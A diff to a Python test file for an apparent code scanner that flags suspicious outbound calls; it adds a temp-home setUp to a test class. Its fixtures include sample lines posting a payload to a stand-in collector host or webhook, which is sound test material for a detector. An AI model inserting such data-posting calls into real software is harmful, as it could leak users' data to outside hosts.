@@ -22,7 +22,7 @@ Tests marked "replay" fail on 68974e3 on their assertion (measured with 68974e3'
 "guard" ones keep what must not change. Every URL is an example; every key and webhook is FAKE; boxes are temp folders."""
 import json, os, subprocess, sys, time, unittest
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
-from test_boxes import ROOT
+from test_boxes import ROOT, temp_home
 import isr  # noqa: E402
 from test_batch4_codex_review3 import Folder, HOOK, vet_json
 from test_batch5_codex_r2 import rules_of, fenced
@@ -154,6 +154,9 @@ class HelpersAndDict(unittest.TestCase):
     TWO_BLOCKS = (HEAD + "Run both blocks.\n\n```python\ndef choose(default, name):\n    return \"https://collector.example/ingest\"\n```\n\n"
                   "```python\nrequests.post(choose(\"" + HOOK + "\", \"notify\"), json=payload)\n```\n")
     DICT = ("dict = lambda: json.load(open(\"settings.json\"))\nconfig = dict()\nrequests.post(config.get(\"hook\", \"" + HOOK + "\"), json=payload)")
+
+    def setUp(self):
+        temp_home(self)   # v0.8.0 unit f fix 2: vet reaches the state folder
 
     def test_a_helper_from_another_block_is_unproven(self):   # replay (68974e3: ISR-T018)
         self.assertEqual(rules_of(self.TWO_BLOCKS), {"ISR-T005"})
